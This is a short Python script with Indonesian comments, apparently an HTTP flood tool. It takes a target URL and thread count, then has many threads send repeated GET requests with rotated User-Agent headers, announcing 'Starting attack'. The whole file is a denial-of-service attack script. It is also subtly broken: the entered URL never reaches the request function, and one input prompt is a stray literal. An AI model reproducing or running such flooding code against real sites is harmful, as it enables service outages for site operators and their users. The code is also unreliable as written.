import os
import sys
import time
import random
import requests
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# Konfigurasi
TARGET_URL = ""
NUM_THREADS = 0
RATE_LIMIT = 0
USER_AGENT_FILE = "user_agents.txt"

# Load user agents
def load_user_agents(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"Tidak ditemukan file user agent: {file_path}")
        sys.exit(1)

# Fungsi untuk mengirim request
def send_request(url, user_agent):
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        if response.status_code >= 200 and response.status_code < 300:
            print(f"Send Request: {url}")
        else:
            print(f"Failed Request: {url} ({response.status_code})")
    except requests.exceptions.RequestException as e:
        print(f"Failed Request: {url} ({e})")

# Fungsi untuk menjalankan worker
def worker(url, user_agents, num_requests):
    for _ in range(num_requests):
        user_agent = random.choice(user_agents)
        send_request(url, user_agent)
        time.sleep(RATE_LIMIT / 1000)

# Fungsi untuk menjalankan pool worker
def worker_pool(url, num_threads, num_requests, user_agents):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for _ in range(num_threads):
            futures.append(executor.submit(worker, url, user_agents, num_requests))
        for future in futures:
            future.result()

# Fungsi utama
def main():
    global TARGET_URL, NUM_THREADS, RATE_LIMIT
    print("~~~~~MEMEY~~~~~")
    URL = input("web URL: ")
    if not URL:
        print("Input web URL ")
        sys.exit(1)
    NUM_THREADS = int(input("threads: "))
    if NUM_THREADS <= 0:
        print("Threads harus lebih besar dari 0")
        sys.exit(1)
    RATE_LIMIT = int(input("100"))
    if RATE_LIMIT <= 0:
        print("Rate limit harus lebih besar dari 0")
        sys.exit(1)
    user_agents = load_user_agents(USER_AGENT_FILE)
    if not user_agents:
        print("User agent list kosong")
        sys.exit(1)
    print(f"Starting attack at {TARGET_URL} with {NUM_THREADS} threads")
    start_time = datetime.now()
    worker_pool(TARGET_URL, NUM_THREADS, 100, user_agents)
    end_time = datetime.now()
    print(f"End {end_time - start_time}")

if __name__ == "__main__":
    main()
